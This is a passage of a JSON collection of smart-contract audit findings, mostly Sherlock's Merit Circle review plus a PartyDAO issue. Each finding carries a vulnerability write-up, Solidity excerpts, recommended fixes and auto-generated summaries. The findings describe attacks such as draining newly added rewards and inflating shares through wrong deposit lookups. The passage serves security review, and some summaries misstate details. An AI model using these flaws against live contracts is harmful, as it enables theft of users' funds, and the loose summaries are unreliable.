      "content": "Source: https://github.com/sherlock-audit/2022-10-merit-circle-judging/issues/106 \n\n## Found by \nWATCHPUG, hickuphh3, hyh\n\n## Summary\n\nA surge of pointsPerShare on each `distributeRewards()` call can be used by the attacker to steal part of the newly added rewards.\n\n## Vulnerability Detail\n\nEvery time the `distributeRewards()` gets called, there will be a surge of `pointsPerShare` for the existing stakeholders.\n\nThis enables a well-known attack vector, in which the attacker will deposit a huge amount of underlying tokens and take a large portion of the pool, then trigger the surge, and exit right after.\n\n## Impact\n\nWhile the existence of the `MIN_LOCK_DURATION` prevented the usage of flashloan, it's still possible for the attackers with sufficient funds or can acquire sufficient funds in other ways.\n\nIn which case, the attack is quite practical and effectively steal the major part of the newly added rewards\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-merit-circle/blob/main/merit-liquidity-mining/contracts/base/BasePool.sol#L95-L98\n\nhttps://github.com/sherlock-audit/2022-10-merit-circle/blob/main/merit-liquidity-mining/contracts/base/AbstractRewards.sol#L89-L99\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider using a `rewardRate`-based gradual release model, pioneered by Synthetix's StakingRewards contract.\n\nSee: https://github.com/Synthetixio/synthetix/blob/develop/contracts/StakingRewards.sol#L113-L132\n\n## Discussion\n\n**federava**\n\nRaising the MIN_LOCK_DURATION from 10 minutes to 1 day.\n\n**federava**\n\n[PR](https://github.com/Merit-Circle/merit-liquidity-mining/pull/14) from this issue",
      "summary": "\nThis bug report is about a vulnerability in the Merit Circle Judgement protocol, which allows an attacker to steal newly added rewards. The attack vector is triggered by a surge of pointsPerShare every time the `distributeRewards()` function is called. This enables the attacker to deposit a large portion of the pool, trigger the surge, and exit after stealing the major part of the newly added rewards. The vulnerability was discovered by WATCHPUG, hickuphh3, and hyh, who used manual review as the tool. A recommendation is made to consider using a rewardRate-based gradual release model to prevent the attack. The discussion section includes a suggestion to raise the `MIN_LOCK_DURATION` from 10 minutes to 1 day, as well as a link to a pull request from this issue.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Merit Circle",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-merit-circle-judging/issues/106",
      "tags": [
        "Share Inflation",
        "Front-Running"
      ],
      "finders": [
        "WATCHPUG",
        "hyh",
        "hickuphh3"
      ]
    },
    {
      "id": "3472",
      "title": "M-3: `escrowedReward` will be frozen in the contract if `escrowPool == address(0)` but `escrowPortion > 0`",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-merit-circle-judging/issues/107 \n\n## Found by \nbin2chen, hickuphh3, saian, Jeiwan, WATCHPUG, ctf\\_sec, berndartmueller\n\n## Summary\n\nA portion of users' reward, which is expected to be \"escrowed\", will be frozen in the pool contract if `escrowPool == address(0)` but `escrowPortion > 0`.\n\n## Vulnerability Detail\n\nSetting `_escrowPool` to `address(0)` is allowed in `__BasePool_init()`:\n\nhttps://github.com/sherlock-audit/2022-10-merit-circle/blob/main/merit-liquidity-mining/contracts/base/BasePool.sol#L75-L77\n\nHowever, when `escrowPortion > 0`, if `escrowPool == address(0)`, `claimRewards()` will still only transferring `nonEscrowedRewardAmount` to the `_receiver` and left the `escrowedRewardAmount` in the contract.\n\n## Impact\n\nAs a result, a portion (`escrowPortion`) of the rewards will be frozen in the contract, and there is no way for the users or even the admin to retrieve these rewards.\n\n## Code Snippet\n\nhttps://github.com/Merit-Circle/merit-liquidity-mining/blob/ce5feaae19126079d309ac8dd9a81372648437f1/contracts/base/BasePool.sol#L100-L115\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nChange to:\n\n```solidity\nfunction claimRewards(address _receiver) external {\n    uint256 rewardAmount = _prepareCollect(_msgSender());\n    uint256 escrowedRewardAmount = 0;\n\n    if(escrowPortion != 0 && address(escrowPool) != address(0)) {\n        escrowedRewardAmount = rewardAmount * escrowPortion / 1e18;\n        if (escrowedRewardAmount != 0) {\n            escrowPool.deposit(escrowedRewardAmount, escrowDuration, _receiver);\n            rewardAmount -= escrowedRewardAmount;\n        }\n    }\n\n    // ignore dust\n    if(rewardAmount > 1) {\n        rewardToken.safeTransfer(_receiver, rewardAmount);\n    }\n\n    emit RewardsClaimed(_msgSender(), _receiver, escrowedRewardAmount, rewardAmount);\n}\n```\n\n## Discussion\n\n**federava**\n\nConditions stablished in this issue, that is, `escrowPool == address(0)` and `escrowPortion > 0` will never be met because pools are deployed with:\n\n`escrowPool  != address(0)` and `escrowPortion > 0`\nor\n`escrowPool  == address(0)` and `escrowPortion > 0`\n\nAs a priority we could check on deployment that such conditions are not met.\n\n**federava**\n\n[PR](https://github.com/Merit-Circle/merit-liquidity-mining/pull/15) from this issue",
      "summary": "\nThis bug report is about an issue found in the Merit Circle Liquidity Mining Contract. The issue is that if the `escrowPool` is set to `address(0)` and the `escrowPortion` is greater than 0, a portion of users' reward will be frozen in the pool contract. This means that the users and even the admin will not be able to retrieve the rewards. The bug was found by bin2chen, hickuphh3, saian, Jeiwan, WATCHPUG, ctf_sec, berndartmueller, and was confirmed with manual review. The recommended fix is to add a check on deployment that the conditions are not met. This issue has since been resolved with a pull request.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Merit Circle",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-merit-circle-judging/issues/107",
      "tags": [],
      "finders": [
        "Jeiwan",
        "bin2chen",
        "hickuphh3",
        "WATCHPUG",
        "berndartmueller",
        "saian",
        "ctf\\_sec"
      ]
    },
    {
      "id": "3471",
      "title": "M-2: Expired locks should not continue to earn rewards at the original high multiplier rate",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-merit-circle-judging/issues/108 \n\n## Found by \nWATCHPUG\n\n## Summary\n\nExpired locks should be considered as same as the deposits with no lock.\n\n## Vulnerability Detail\n\nThe current implementation allows the deposits with expired locks to continue to enjoy the original high multiplier rate, while they can withdraw anytime they want.\n\nThe multiplier of shares amount is essentially a higher reward rate (APR) for longer period of locks.\n\nFor example:\n\nIf the regular APR is 2%; Locking for 4 years will boost the APR to 10%.\n\n- Alice deposited 1M $MC tokens and got 10% APR;\n- 4 years later, Alice's deposit's lock was expired.\n\nExpected result:\n\nThe new APR for Alice's deposit is 2%;\n\nActual result:\n\nAlice can continue to enjoy a 10% APR while she can withdraw anytime.\n\n## Impact\n\nUsers with expired locks will take more rewards than expected, which means fewer rewards for other users.\n\n## Code Snippet\n\nhttps://github.com/Merit-Circle/merit-liquidity-mining/blob/ce5feaae19126079d309ac8dd9a81372648437f1/contracts/TimeLockPool.sol#L116-L135\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nCurve's Gauge system introduced a method called `kick()` which allows the expired (zeroed) veCRV users to be kicked from the rewards.\n\nSee: https://github.com/curvefi/curve-dao-contracts/blob/master/contracts/gauges/LiquidityGaugeV5.vy#L430-L446\n\nA similar method can be added to solve this issue:\n\n```solidity\nfunction kick(uint256 _depositId, address _user) external {\n    if (_depositId >= depositsOf[_user].length) {\n        revert NonExistingDepositError();\n    }\n    Deposit memory userDeposit = depositsOf[_user][_depositId];\n    if (block.timestamp < userDeposit.end) {\n        revert TooSoonError();\n    }\n\n    // burn pool shares\n    _burn(_user, userDeposit.shareAmount - userDeposit.amount);\n}\n```\n\n## Discussion\n\n**federava**\n\nAgree on the recommendation, will implement kick function. Noticing that shares go back to a 1:1 ratio and that the function can be called by anyone is a good design choice.\n\n**federava**\n\n[PR](https://github.com/Merit-Circle/merit-liquidity-mining/pull/16) from this issue",
      "summary": "\nThis bug report is about an issue in the Merit Circle Liquidity Mining System which allows users with expired locks to continue to enjoy the original high multiplier rate, while they can withdraw anytime they want. This means that users with expired locks will take more rewards than expected, which means fewer rewards for other users. A solution to this issue is to add a function called `kick()` which allows the expired (zeroed) veCRV users to be kicked from the rewards. This function can be called by anyone and shares will go back to a 1:1 ratio. A PR (pull request) from this issue has been submitted and agreed on.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Merit Circle",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-merit-circle-judging/issues/108",
      "tags": [
        "Business Logic",
        "Change Validation",
        "veCRV"
      ],
      "finders": [
        "WATCHPUG"
      ]
    },
    {
      "id": "3470",
      "title": "M-1: Curve points should be guaranteed to be monotonic increasing",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-merit-circle-judging/issues/111 \n\n## Found by \nhickuphh3, minhquanym, WATCHPUG, ElKu, berndartmueller, rvierdiiev\n\n## Summary\n\nLack of checks to ensure the points in the curve are monotonic increasing, which can result in a malfunction of `deposit()` / `extendLock()` due to underflow when the curve is not set properly.\n\n## Vulnerability Detail\n\nIn the current implementation, `getMultiplier()` assume the later point in the curve is always bigger than the previous point, otherwise `curve[n + 1] - curve[n]` will revert due to underflow.\n\nHowever, since there is no check in `__TimeLockPool_init()` / `setCurve()` / `setCurvePoint()` to guarantee that, a lower point can actually be set after a higher point.\n\n## Impact\n\n`deposit()` / `extendLock()` may revert due to underflow.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-merit-circle/blob/main/merit-liquidity-mining/contracts/TimeLockPool.sol#L35-L63\n\nhttps://github.com/sherlock-audit/2022-10-merit-circle/blob/main/merit-liquidity-mining/contracts/TimeLockPool.sol#L280-L311\n\nhttps://github.com/sherlock-audit/2022-10-merit-circle/blob/main/merit-liquidity-mining/contracts/TimeLockPool.sol#L322-L337\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider adding a new internal function to validate the curve points:\n\n```solidity\nfunction checkCurve(uint256[] calldata _curve) internal {\n    if (_curve.length < 2) {\n        revert ShortCurveError();\n    }\n    for (uint256 i; i < curve.length - 1; ++i) {\n            if (\n                curve[i + 1] < curve[i]\n            ) {\n                revert CurveIncreaseError();\n            }\n        }\n}\n```\n\n## Discussion\n\n**federava**\n\nAgree on the recommendation. Using that logic everywhere the curve is set should be sufficient: `setCurve()`, `setCurvePoint()` and in `__TimeLockPool_init()`. Thanks!\n\n**federava**\n\n[PR](https://github.com/Merit-Circle/merit-liquidity-mining/pull/18) from this issue",
      "summary": "\nThis bug report is about an issue found in the code of the Merit Circle Judging system, where checks to ensure the points in the curve are monotonic increasing are lacking. This could lead to a malfunction of `deposit()` / `extendLock()` due to underflow when the curve is not set properly. The code snippet provided in the report shows that there is no check in `__TimeLockPool_init()` / `setCurve()` / `setCurvePoint()` to guarantee that a lower point can actually be set after a higher point. The impact of this issue is that `deposit()` / `extendLock()` may revert due to underflow.\n\nThe recommendation given in the report is to consider adding a new internal function to validate the curve points. This function should check that the curve is not too short, and that the later point in the curve is always bigger than the previous point. It was agreed upon that this logic should be used everywhere the curve is set: `setCurve()`, `setCurvePoint()` and in `__TimeLockPool_init()`. A pull request was created from this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Merit Circle",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-merit-circle-judging/issues/111",
      "tags": [],
      "finders": [
        "minhquanym",
        "hickuphh3",
        "ElKu",
        "WATCHPUG",
        "berndartmueller",
        "rvierdiiev"
      ]
    },
    {
      "id": "3469",
      "title": "H-3: Unit isn't recalculated on curve modification with setCurvePoint",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-merit-circle-judging/issues/101 \n\n## Found by \nbin2chen, Jeiwan, Lambda, Ch\\_301, hyh\n\n## Summary\n\nTimeLockPool's setCurvePoint() can add or remove curve points, changing its length.\n\nIt leaves `unit` variable that governs the duration to multiplier correspondence incorrect as it isn't updated.\n\n## Vulnerability Detail\n\n`unit` becomes incorrect after `onlyGov` setCurvePoint() updates the curve whenever its size changes.\n\nAs setCurvePoint() is an independent operation, the `unit` will just stay incorrect after it. I.e. setCurve() and __TimeLockPool_init() that update the `unit` are alternatives to setCurvePoint(), there is no use cases when they run after setCurvePoint(), fixing the variable. So here it is one scenario, where setCurvePoint() is run and `unit` is incorrect after that.\n\n## Impact\n\nWhen `unit` is incorrect the getMultiplier() calculations become incorrect too.\n\nSuppose `curve.length` was `6`, `unit = maxLockDuration / (curve.length - 1) = maxLockDuration / 5`, then setCurvePoint() shortened the curve, so `curve.length` becomes `3`, but still `unit = maxLockDuration / 5`. Now `getMultiplier(2 * maxLockDuration / 5)` yields maximum shares multiplier as the very end of the curve will be used, while the lock is only `2 / 5` of the `maxLockDuration`.\n\nThe impact is duration multiplier logic either removes the shares from users (when setCurvePoint() increased the length) or provides them with extra shares (when setCurvePoint() decreased the length), in violation of the desired logic. As the shares have monetary value and the precondition is just running a routine setup operation, setting the severity to be high.\n\n## Code Snippet\n\nsetCurvePoint() can change curve length, but leaves `unit` variable intact:\n\nhttps://github.com/sherlock-audit/2022-10-merit-circle/blob/main/merit-liquidity-mining/contracts/TimeLockPool.sol#L313-L337\n\n```solidity\n    /**\n     * @notice Can set a point of the curve.\n     * @dev This function can replace any point in the curve by inputing the existing index,\n     * add a point to the curve by using the index that equals the amount of points of the curve,\n     * and remove the last point of the curve if an index greated than the length is used. The first\n     * point of the curve index is zero.\n     * @param _newPoint uint256 point to be set.\n     * @param _position uint256 position of the array to be set (zero-based indexing convention).\n     */\n    function setCurvePoint(uint256 _newPoint, uint256 _position) external onlyGov {\n        if (_newPoint > maxBonus) {\n            revert MaxBonusError();\n        }\n        if (_position < curve.length) {\n            curve[_position] = _newPoint;\n        } else if (_position == curve.length) {\n            curve.push(_newPoint);\n        } else {\n            if (curve.length - 1 < 2) {\n                revert ShortCurveError();\n            }\n            curve.pop();\n        }\n        emit CurveChanged(_msgSender());\n    }\n```\n\nCurrently `unit` is recalculated on initialization:\n\nhttps://github.com/sherlock-audit/2022-10-merit-circle/blob/main/merit-liquidity-mining/contracts/TimeLockPool.sol#L62\n\n```solidity\n    unit = _maxLockDuration / (curve.length - 1);\n```\n\nAnd on altering curve length with setCurve(), which rebuilds the entire curve:\n\nhttps://github.com/sherlock-audit/2022-10-merit-circle/blob/main/merit-liquidity-mining/contracts/TimeLockPool.sol#L284-L309\n\n```solidity\n        // same length curves\n        if (curve.length == _curve.length) {\n            for (uint i=0; i < curve.length; i++) {\n                curve[i] = maxBonusError(_curve[i]);\n            }\n        // replacing with a shorter curve\n        } else if (curve.length > _curve.length) {\n            for (uint i=0; i < _curve.length; i++) {\n                curve[i] = maxBonusError(_curve[i]);\n            }\n            uint initialLength = curve.length;\n            for (uint j=0; j < initialLength - _curve.length; j++) {\n                curve.pop();\n            }\n            unit = maxLockDuration / (curve.length - 1);\n        // replacing with a longer curve\n        } else {\n            for (uint i=0; i < curve.length; i++) {\n                curve[i] = maxBonusError(_curve[i]);\n            }\n            uint initialLength = curve.length;\n            for (uint j=0; j < _curve.length - initialLength; j++) {\n                curve.push(maxBonusError(_curve[initialLength + j]));\n            }\n            unit = maxLockDuration / (curve.length - 1);\n        }\n```\n\n`unit` maps `_lockDuration` to the point on the curve, breaking this link if curve length had changed, while `unit` stayed the same:\n\nhttps://github.com/sherlock-audit/2022-10-merit-circle/blob/main/merit-liquidity-mining/contracts/TimeLockPool.sol#L233-L246\n\n```solidity\n    function getMultiplier(uint256 _lockDuration) public view returns(uint256) {\n        // There is no need to check _lockDuration amount, it is always checked before\n        // in the functions that call this function\n\n        // n is the time unit where the lockDuration stands\n        uint n = _lockDuration / unit;\n        // if last point no need to interpolate\n        // trim de curve if it exceedes the maxBonus // TODO check if this is needed\n        if (n == curve.length - 1) {\n            return 1e18 + curve[n];\n        }\n        // linear interpolation between points\n        return 1e18 + curve[n] + (_lockDuration - n * unit) * (curve[n + 1] - curve[n]) / unit;\n    }\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider recalculation `unit` on the spot each time:\n\nhttps://github.com/sherlock-audit/2022-10-merit-circle/blob/main/merit-liquidity-mining/contracts/TimeLockPool.sol#L313-L337\n\n```solidity\n    /**\n     * @notice Can set a point of the curve.\n     * @dev This function can replace any point in the curve by inputing the existing index,\n     * add a point to the curve by using the index that equals the amount of points of the curve,\n     * and remove the last point of the curve if an index greated than the length is used. The first\n     * point of the curve index is zero.\n     * @param _newPoint uint256 point to be set.\n     * @param _position uint256 position of the array to be set (zero-based indexing convention).\n     */\n    function setCurvePoint(uint256 _newPoint, uint256 _position) external onlyGov {\n        if (_newPoint > maxBonus) {\n            revert MaxBonusError();\n        }\n        if (_position < curve.length) {\n            curve[_position] = _newPoint;\n        } else if (_position == curve.length) {\n            curve.push(_newPoint);\n+           unit = maxLockDuration / (curve.length - 1);\n        } else {\n            if (curve.length - 1 < 2) {\n                revert ShortCurveError();\n            }\n            curve.pop();\n+           unit = maxLockDuration / (curve.length - 1);\n        }\n        emit CurveChanged(_msgSender());\n    }\n```\n\nsetCurvePoint() is rare enough operation and cost of incorrect `unit` is rather big here, so the additional gas cost is justified.\n\n## Discussion\n\n**federava**\n\nAgree on the recommendation, thanks!\n\n**federava**\n\n[PR](https://github.com/Merit-Circle/merit-liquidity-mining/pull/11) from this issue",
      "summary": "\nThis bug report is about an issue in the TimeLockPool contract of the Merit-Circle project. Five users, bin2chen, Jeiwan, Lambda, Ch_301, and hyh, found that when the setCurvePoint() function is used to add or remove points from the curve, the unit variable that governs the duration to multiplier correspondence is not updated. This ultimately results in incorrect getMultiplier() calculations, either removing shares from users or providing them with extra shares. \n\nThe code snippet of the setCurvePoint() function is provided, and it is noted that the unit variable is only recalculated on initialization and when the curve length is altered using the setCurve() function, which rebuilds the entire curve. The getMultiplier() function is also provided, which uses the unit variable to map the _lockDuration to the point on the curve.\n\nThe impact of this issue is that users are either receiving too many or too few shares, which has a monetary value and therefore the severity is set to high. The recommendation is to consider recalculating the unit variable on the spot each time the setCurvePoint() function is used, as this is a rare enough operation and the cost of an incorrect unit variable is high. This is agreed upon and a PR is provided.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Merit Circle",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-merit-circle-judging/issues/101",
      "tags": [],
      "finders": [
        "Ch\\_301",
        "Jeiwan",
        "bin2chen",
        "Lambda",
        "hyh"
      ]
    },
    {
      "id": "3468",
      "title": "H-2: `increaseLock()` should read `userDeposit[_receiver]` instead of `depositsOf[_msgSender()]`",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-merit-circle-judging/issues/102 \n\n## Found by \nHonorLt, saian, Zarf, WATCHPUG, hyh, CodingNameKiki, rvierdiiev\n\n## Summary\n\n`TimeLockPool.sol#L203` should read `depositsOf[_receiver][_depositId]` as `userDeposit`.\n\n## Vulnerability Detail\n\n`TimeLockPool.sol#L230` in `increaseLock()` is loading `depositsOf[_msgSender()][_depositId]` as `userDeposit`, which will later be used to check if the deposit has expired (L206-208) and calculating the `remainingDuration` (L213).\n\nThis `remainingDuration` will be used to calculate the multiplier for the `mintAmount` at L215.\n\n## Impact\n\nAs a result, the `_receiver` can receive a much larger shares.\n\nFor example, if the receiver only has 10 mins left in `depositsOf[_receiver][_depositId]`, but `depositsOf[_msgSender()][_depositId]` have 4 years left. The `mintAmount` will be 5x than expected.\n\nOr fewer shares than expected when the caller's deposit's `remainingDuration` is shorter than the receiver's.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-merit-circle/blob/main/merit-liquidity-mining/contracts/TimeLockPool.sol#L197-L222\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nChange L203 to:\n\n```solidity\nDeposit memory userDeposit = depositsOf[_receiver][_depositId];\n```\n\n## Discussion\n\n**federava**\n\nAgree on the recommendation, thanks!\n\n**federava**\n\n[PR](https://github.com/Merit-Circle/merit-liquidity-mining/pull/12) from this issue",
      "summary": "\nThis bug report is about an issue in the TimeLockPool.sol smart contract, which is part of the Merit Circle liquidity mining project. Seven people (HonorLt, saian, Zarf, WATCHPUG, hyh, CodingNameKiki, rvierdiiev) found this issue, which is located on line 230 of the TimeLockPool.sol contract. The issue is that the contract is loading the wrong variable, `depositsOf[_msgSender()][_depositId]`, as `userDeposit`, which will later be used to check if the deposit has expired and calculating the `remainingDuration`. This `remainingDuration` will be used to calculate the multiplier for the `mintAmount` at line 215. As a result, the `_receiver` can receive a much larger shares than expected, or fewer shares than expected when the caller's deposit's `remainingDuration` is shorter than the receiver's. The recommendation is to change line 203 to `Deposit memory userDeposit = depositsOf[_receiver][_depositId];`. The PR (pull request) from this issue has been accepted.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Merit Circle",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-merit-circle-judging/issues/102",
      "tags": [],
      "finders": [
        "CodingNameKiki",
        "WATCHPUG",
        "hyh",
        "saian",
        "HonorLt",
        "rvierdiiev",
        "Zarf"
      ]
    },
    {
      "id": "3467",
      "title": "H-1: Extend lock period should never result in a decrease of overall rewards (`total length of locked period * shares`)",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-merit-circle-judging/issues/109 \n\n## Found by \nWATCHPUG\n\n## Summary\n\nThe current implementation may result in a burn of shares when `extendLock()`, which may result in a decrease of overall rewards (`total length of locked period * shares`).\n\n## Vulnerability Detail\n\nIn the current implementation, when the user calls `extendLock()` for a deposit with `duration1` at time `t`, with `_increaseDuraiton = duration2`, it will create a new lock with a lock period of `duration1 + duration2 - time`.\n\nFor example:\n\nIf the multiplier for a 6 mos lock is 150% and 200% for a 1 year lock.\n\n- Alice deposited 100 $MC tokens with the initial lock of 1 year, received 200 shares;\n- 6 mos later, Alice called `extendLock()` to extend the deposit's lock for 10 more minutes (`MIN_LOCK_DURATION`), ~50 shares will be burned.\n\nExpected result:\n\nThe total rewards should be no less than a 1 year lock;\n\nActual result:\n\nThe total rewards should is only `200 * 6 mos + 150 * 6 mos` vs `200 * 12 mos` for a 1 year lock;\n\nBy extend the lock for 10 more mins, Alice actually reduced the total rewards by 12.5%.\n\n## Impact\n\nUsers may lose rewards by extending the lock.\n\n## Code Snippet\n\nhttps://github.com/Merit-Circle/merit-liquidity-mining/blob/ce5feaae19126079d309ac8dd9a81372648437f1/contracts/TimeLockPool.sol#L148-L184\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider introducing a new concept called `deferredLock` when `extendLock()` will result in the `newEndTime - block.timestamp < currentDuration`, in which case, instead of burning shares, it will set a deferred lock to be executable only after the current lock expires:\n\n```solidity\nfunction extendLock(uint256 _depositId, uint256 _increaseDuration) external {\n    // Check if actually increasing\n    if (_increaseDuration == 0) {\n        revert ZeroDurationError();\n    }\n\n    Deposit memory userDeposit = depositsOf[_msgSender()][_depositId];\n\n    // Only can extend if it has not expired\n    if (block.timestamp >= userDeposit.end) {\n        revert DepositExpiredError();\n    }\n    \n    // Enforce min increase to prevent flash loan or MEV transaction ordering\n    uint256 increaseDuration = _increaseDuration.max(MIN_LOCK_DURATION);\n    \n    // New duration is the time expiration plus the increase\n    uint256 duration = maxLockDuration.min(uint256(userDeposit.end - block.timestamp) + increaseDuration);\n\n    uint256 mintAmount = userDeposit.amount * getMultiplier(duration) / 1e18;\n\n    // Multiplier curve changes with time, need to check if the mint amount is bigger, equal or smaller than the already minted\n    \n    // If the new amount if bigger mint the difference\n    if (mintAmount > userDeposit.shareAmount) {\n        depositsOf[_msgSender()][_depositId].shareAmount =  mintAmount;\n        _mint(_msgSender(), mintAmount - userDeposit.shareAmount);\n\n        depositsOf[_msgSender()][_depositId].start = uint64(block.timestamp);\n        depositsOf[_msgSender()][_depositId].end = uint64(block.timestamp) + uint64(duration);\n        emit LockExtended(_depositId, _increaseDuration, _msgSender());\n\n        // reset deferredLock if any\n        if (deferredLocks[_msgSender()][_depositId] > 0) {\n            deferredLocks[_msgSender()][_depositId] = 0;\n        }\n    // If the new amount is less then set a deferred lock\n    } else if (mintAmount < userDeposit.shareAmount) {\n        deferredLocks[_msgSender()][_depositId] = increaseDuration\n    }\n}\n```\n\nFor expired locks, when there is a `deferredLock`, extend the lock and burn the differences in shares:\n\n```solidity\nfunction kick(uint256 _depositId, address _user) external {\n    if (_depositId >= depositsOf[_user].length) {\n        revert NonExistingDepositError();\n    }\n    Deposit memory userDeposit = depositsOf[_user][_depositId];\n    if (block.timestamp < userDeposit.end) {\n        revert TooSoonError();\n    }\n\n    uint256 newSharesAmount = userDeposit.amount;\n\n    uint256 deferredLock = deferredLocks[_user][_depositId];\n    if (deferredLock != 0) {\n        newSharesAmount = userDeposit.amount * getMultiplier(deferredLock) / 1e18;\n\n        depositsOf[_user][_depositId].start = uint64(block.timestamp);\n        depositsOf[_user][_depositId].end = uint64(block.timestamp) + uint64(deferredLock);\n        emit LockExtended(_depositId, _increaseDuration, _user);\n    }\n\n    // burn pool shares\n    _burn(_user, userDeposit.shareAmount - newSharesAmount);\n}\n```\n\n## Discussion\n\n**federava**\n\nAfter some internal discussion we think it is better to revert if `extendLock` would result in burn of the tokens.\n\n**federava**\n\n[PR](https://github.com/Merit-Circle/merit-liquidity-mining/pull/17) from this issue",
      "summary": "\nThis bug report is about an issue with the Merit Circle Liquidity Mining contract, which may result in a decrease of overall rewards (`total length of locked period * shares`) when a user calls `extendLock()` on a deposit with `duration1` at time `t`, with `_increaseDuraiton = duration2`. This can be demonstrated with an example of a user, Alice, who deposits 100 $MC tokens with an initial lock of 1 year and receives 200 shares. If she then calls `extendLock()` to extend the deposit's lock for 10 more minutes (`MIN_LOCK_DURATION`), ~50 shares will be burned. This would result in the total rewards being only `200 * 6 mos + 150 * 6 mos` vs `200 * 12 mos` for a 1 year lock, which is a decrease of 12.5%.\n\nThe impact of this issue is that users may lose rewards when extending the lock. The code snippet and tool used to find the issue are provided in the report. The recommendation is to introduce a new concept called `deferredLock` when `extendLock()` will result in the `newEndTime - block.timestamp < currentDuration`, in which case, instead of burning shares, it will set a deferred lock to be executable only after the current lock expires. For expired locks, when there is a `deferredLock`, extend the lock and burn the differences in shares. After some internal discussion, it was decided that it is better to revert if `extendLock` would result in burn of the tokens, and a PR from this issue has been submitted.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Merit Circle",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-merit-circle-judging/issues/109",
      "tags": [
        "Wrong Math"
      ],
      "finders": [
        "WATCHPUG"
      ]
    },
    {
      "id": "42832",
      "title": "[M-09] Calling `transferEth` function can revert if `receiver` input corresponds to a contract that is unable to receive ETH through its `receive` or `fallback` function",
      "impact": "MEDIUM",
      "content": "_Submitted by rbserver, also found by CertoraInc, Jeiwan, and tonisives_\n\n<https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/utils/LibAddress.sol#L8-L15>\n\n<https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/crowdfund/Crowdfund.sol#L444-L489>\n\n<https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/distribution/TokenDistributor.sol#L371-L388>\n\n### Impact\n\nThe following `transferEth` function is called when calling the `_burn` or `_transfer` function below. If the `receiver` input for the `transferEth` function corresponds to a contract, it is possible that the receiver contract does not, intentionally or unintentionally, implement the `receive` or `fallback` function in a way that supports receiving ETH or that calling the receiver contract's `receive` or `fallback` function executes complicated logics that cost much gas, which could cause calling `transferEth` to revert. For example, when calling `transferEth` reverts, calling `_burn` also reverts; this means that the receiver contract would not be able to get the voting power and receive the extra contribution it made after the crowdfunding finishes; yet, the receiver contract deserves these voting power and contribution refund. Hence, the receiver contract loses valuables that it deserves, which is unfair to the users who controls it.\n\n<https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/utils/LibAddress.sol#L8-L15>\n\n```solidity\n    function transferEth(address payable receiver, uint256 amount)\n        internal\n    {\n        (bool s, bytes memory r) = receiver.call{value: amount}(\"\");\n        if (!s) {\n            revert EthTransferFailed(receiver, r);\n        }\n    }\n```\n\n<https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/crowdfund/Crowdfund.sol#L444-L489>\n\n```solidity\n    function _burn(address payable contributor, CrowdfundLifecycle lc, Party party_)\n        private\n    {\n        // If the CF has won, a party must have been created prior.\n        if (lc == CrowdfundLifecycle.Won) {\n            if (party_ == Party(payable(0))) {\n                revert NoPartyError();\n            }\n        } else if (lc != CrowdfundLifecycle.Lost) {\n            // Otherwise it must have lost.\n            revert WrongLifecycleError(lc);\n        }\n        // Split recipient can burn even if they don't have a token.\n        if (contributor == splitRecipient) {\n            if (_splitRecipientHasBurned) {\n                revert SplitRecipientAlreadyBurnedError();\n            }\n            _splitRecipientHasBurned = true;\n        }\n        // Revert if already burned or does not exist.\n        if (splitRecipient != contributor || _doesTokenExistFor(contributor)) {\n            CrowdfundNFT._burn(contributor);\n        }\n        // Compute the contributions used and owed to the contributor, along\n        // with the voting power they'll have in the governance stage.\n        (uint256 ethUsed, uint256 ethOwed, uint256 votingPower) =\n            _getFinalContribution(contributor);\n        if (votingPower > 0) {\n            // Get the address to delegate voting power to. If null, delegate to self.\n            address delegate = delegationsByContributor[contributor];\n            if (delegate == address(0)) {\n                // Delegate can be unset for the split recipient if they never\n                // contribute. Self-delegate if this occurs.\n                delegate = contributor;\n            }\n            // Mint governance NFT for the contributor.\n            party_.mint(\n                contributor,\n                votingPower,\n                delegate\n            );\n        }\n        // Refund any ETH owed back to the contributor.\n        contributor.transferEth(ethOwed);\n        emit Burned(contributor, ethUsed, ethOwed, votingPower);\n    